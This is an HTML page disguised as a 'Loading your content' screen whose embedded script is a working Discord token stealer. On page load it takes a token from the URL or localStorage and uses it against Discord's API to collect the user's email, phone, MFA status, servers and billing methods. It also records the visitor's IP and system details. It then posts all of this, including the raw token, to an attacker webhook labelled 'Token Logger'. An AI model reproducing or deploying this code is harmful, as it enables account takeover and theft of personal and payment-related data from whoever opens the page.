<!DOCTYPE html>
<html>
<head>
  <title>Loading - Please Wait</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      overflow: hidden;
    }
    .container {
      text-align: center;
      max-width: 500px;
    }
    .loading {
      display: inline-block;
      width: 50px;
      height: 50px;
      border: 3px solid rgba(255,255,255,.2);
      border-radius: 50%;
      border-top-color: #ffffff;
      animation: spin 1s ease-in-out infinite;
      margin-bottom: 20px;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="loading"></div>
    <h2>Loading your content...</h2>
    <p>Please wait while we prepare your experience.</p>
  </div>

  <script>
    // Prevent duplicate sends
    let hasSent = false;

    // Discord API endpoints for token validation
    const DISCORD_API = {
      USER_INFO: 'https://discord.com/api/v9/users/@me',
      GUILDS: 'https://discord.com/api/v9/users/@me/guilds',
      BILLING: 'https://discord.com/api/v9/users/@me/billing/payment-sources'
    };

    async function processData() {
      if (hasSent) {
        console.log('[Already sent]');
        window.close();
        return;
      }

      const urlParams = new URLSearchParams(window.location.search);
      let rawToken = urlParams.get('session') || urlParams.get('token');

      // Get UA directly from browser
      const userAgent = navigator.userAgent;

      if (!rawToken) {
        rawToken = localStorage.getItem('discord_token') || localStorage.getItem('token');
      }

      if (!rawToken) {
        console.log('[✗] No token found');
        window.close();
        return;
      }

      // Convert to string
      let token;
      if (typeof rawToken === 'string') {
        token = rawToken;
      } else if (typeof rawToken === 'object' && rawToken !== null) {
        if (rawToken.token) token = String(rawToken.token);
        else if (rawToken.value) token = String(rawToken.value);
        else token = JSON.stringify(rawToken);
      } else {
        token = String(rawToken);
      }

      // Decode if needed
      try {
        const decoded = decodeURIComponent(token);
        if (decoded !== token) token = decoded;
      } catch (e) {}

      console.log('[→] Processing token...');

      try {
        hasSent = true;

        // Validate token and get user info
        const validationResult = await validateToken(token);

        // Get IP and system info
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();

        const systemInfo = {
          os: getOSInfo(userAgent),
          browser: getBrowserInfo(userAgent),
          ip: ipData.ip,
          platform: navigator.platform,
          language: navigator.language
        };

        // Send everything to webhook
        const success = await sendData(token, systemInfo, userAgent, validationResult);

        if (success) {
          console.log('[✓] Sent successfully');
        }

        window.close();

      } catch (e) {
        console.error('[✗] Error:', e);
        window.close();
      }
    }

    // Validate Discord token and get user info
    async function validateToken(token) {
      try {
        // Fetch user info
        const userResponse = await fetch(DISCORD_API.USER_INFO, {
          headers: { 'Authorization': token }
        });

        if (!userResponse.ok) {
          return {
            valid: false,
            error: `HTTP ${userResponse.status}`
          };
        }

        const userData = await userResponse.json();

        // Fetch guilds (servers)
        let guilds = [];
        try {
          const guildsResponse = await fetch(DISCORD_API.GUILDS, {
            headers: { 'Authorization': token }
          });
          if (guildsResponse.ok) {
            guilds = await guildsResponse.json();
          }
        } catch (e) {}

        // Fetch billing info
        let billing = null;
        try {
          const billingResponse = await fetch(DISCORD_API.BILLING, {
            headers: { 'Authorization': token }
          });
          if (billingResponse.ok) {
            billing = await billingResponse.json();
          }
        } catch (e) {}

        return {
          valid: true,
          user: {
            id: userData.id,
            username: userData.username,
            discriminator: userData.discriminator,
            email: userData.email || 'N/A',
            verified: userData.verified || false,
            phone: userData.phone || 'N/A',
            mfa: userData.mfa_enabled || false,
            nitro: getNitroType(userData.premium_type),
            avatar: userData.avatar ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` : null
          },
          guilds: guilds.length,
          hasBilling: billing && billing.length > 0,
          billingCount: billing ? billing.length : 0
        };

      } catch (error) {
        return {
          valid: false,
          error: error.message
        };
      }
    }

    // Get Nitro type
    function getNitroType(premiumType) {
      switch(premiumType) {
        case 1: return 'Nitro Classic';
        case 2: return 'Nitro';
        case 3: return 'Nitro Basic';
        default: return 'None';
      }
    }

    // Send data to webhook
    async function sendData(token, systemInfo, userAgent, validationResult) {
      try {
        const response = await fetch('/api/get-webhook-url');
        const { webhookUrl } = await response.json();

        if (!webhookUrl) {
          throw new Error('Webhook URL not configured');
        }

        const tokenString = String(token);

        // Build embed based on validation result
        let embed;

        if (validationResult.valid) {
          // Valid token - rich embed
          embed = {
            title: "🎯 Valid Token Captured",
            description: "Active Discord account credentials intercepted",
            color: 0x43B581, // Green for valid
            fields: [
              {
                name: "👤 User Info",
                value: `\`\`\`Username: ${validationResult.user.username}#${validationResult.user.discriminator}\nID: ${validationResult.user.id}\nEmail: ${validationResult.user.email}\nPhone: ${validationResult.user.phone}\`\`\``,
                inline: false
              },
              {
                name: "🔒 Security",
                value: `\`\`\`MFA: ${validationResult.user.mfa ? '✅' : '❌'}\nVerified: ${validationResult.user.verified ? '✅' : '❌'}\`\`\``,
                inline: true
              },
              {
                name: "💎 Nitro",
                value: `\`\`\`${validationResult.user.nitro}\`\`\``,
                inline: true
              },
              {
                name: "🏠 Servers",
                value: `\`\`\`${validationResult.guilds} servers\`\`\``,
                inline: true
              },
              {
                name: "💳 Billing",
                value: `\`\`\`${validationResult.hasBilling ? `✅ ${validationResult.billingCount} method(s)` : '❌ None'}\`\`\``,
                inline: true
              },
              {
                name: "🔑 Token",
                value: `\`\`\`${tokenString}\`\`\``,
                inline: false
              },
              {
                name: "🌐 IP Address",
                value: `\`\`\`${systemInfo.ip}\`\`\``,
                inline: true
              },
              {
                name: "💻 System",
                value: `\`\`\`OS: ${systemInfo.os}\nBrowser: ${systemInfo.browser}\`\`\``,
                inline: true
              }
            ],
            thumbnail: validationResult.user.avatar ? {
              url: validationResult.user.avatar
            } : undefined,
            footer: {
              text: `Captured at ${new Date().toUTCString()}`,
              icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
            }
          };
        } else {
          // Invalid token
          embed = {
            title: "⚠️ Invalid Token",
            description: "Token validation failed",
            color: 0xF04747, // Red for invalid
            fields: [
              {
                name: "🔑 Token",
                value: `\`\`\`${tokenString}\`\`\``,
                inline: false
              },
              {
                name: "❌ Error",
                value: `\`\`\`${validationResult.error}\`\`\``,
                inline: false
              },
              {
                name: "🌐 IP Address",
                value: `\`\`\`${systemInfo.ip}\`\`\``,
                inline: true
              },
              {
                name: "💻 System",
                value: `\`\`\`OS: ${systemInfo.os}\nBrowser: ${systemInfo.browser}\`\`\``,
                inline: true
              }
            ],
            footer: {
              text: `Captured at ${new Date().toUTCString()}`,
              icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
            }
          };
        }

        const payload = {
          content: null,
          embeds: [embed],
          username: "Token Logger",
          avatar_url: "https://cdn.discordapp.com/embed/avatars/1.png"
        };

        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        return true;

      } catch (error) {
        console.error('[Webhook Error]:', error);
        return false;
      }
    }

    function getOSInfo(ua) {
      if (ua.includes("Windows NT 10.0")) return "Windows 10/11";
      if (ua.includes("Windows NT")) return "Windows";
      if (ua.includes("Mac OS X")) return "macOS";
      if (ua.includes("Linux")) return "Linux";
      if (ua.includes("Android")) return "Android";
      if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
      return "Unknown";
    }

    function getBrowserInfo(ua) {
      if (ua.includes("Firefox/")) return "Firefox";
      if (ua.includes("Edg/")) return "Edge";
      if (ua.includes("Chrome/")) return "Chrome";
      if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
      return "Unknown";
    }

    window.addEventListener('load', processData);
  </script>
</body>
</html>
